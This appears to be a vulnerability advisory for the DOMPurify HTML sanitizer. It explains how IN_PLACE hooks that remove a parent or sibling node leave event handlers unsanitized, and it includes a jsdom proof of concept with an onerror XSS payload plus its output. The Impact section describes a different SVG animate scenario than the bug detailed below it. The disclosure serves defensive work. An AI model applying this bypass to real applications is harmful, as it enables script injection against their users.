### Impact

Stored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.

### Summary

The 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.

The README says: "Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns." That does not hold when the detached node is not the hook's own node.

### Tested versions

- 3.4.16 (latest) and main at 18f8f0e
- also 3.4.15, 3.4.12 and 2.5.8

jsdom for the matrix below, and Chromium (Playwright) for the event actually firing.

### Details

`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:

```js
if (currentNode === root || getParentNode(currentNode) !== null) {
  return false;
}
if (IN_PLACE) {
  _neutralizeSubtree(currentNode);
}
```

It only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.

### PoC (jsdom)

```js
const { JSDOM } = require('jsdom')
const createDOMPurify = require('dompurify')
const win = new JSDOM('<!doctype html><body></body>').window
const doc = win.document

for (const mode of ['self', 'parent', 'nextSibling']) {
  const DOMPurify = createDOMPurify(win)
  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +
    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'
  const root = doc.getElementById('root')
  const evil = doc.getElementById('evil')

  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.getAttribute && node.getAttribute('class') === 'bad') {
      if (mode === 'self') node.remove()
      if (mode === 'parent') node.parentNode.remove()
      if (mode === 'nextSibling') node.nextElementSibling.remove()
    }
  })

  DOMPurify.sanitize(root, { IN_PLACE: true })
  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))
}
```

Output on 3.4.16:

```
3.4.16 self        onerror = null
3.4.16 parent      onerror = "alert(1)"
3.4.16 nextSibling onerror = "alert(1)"
```

In `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.

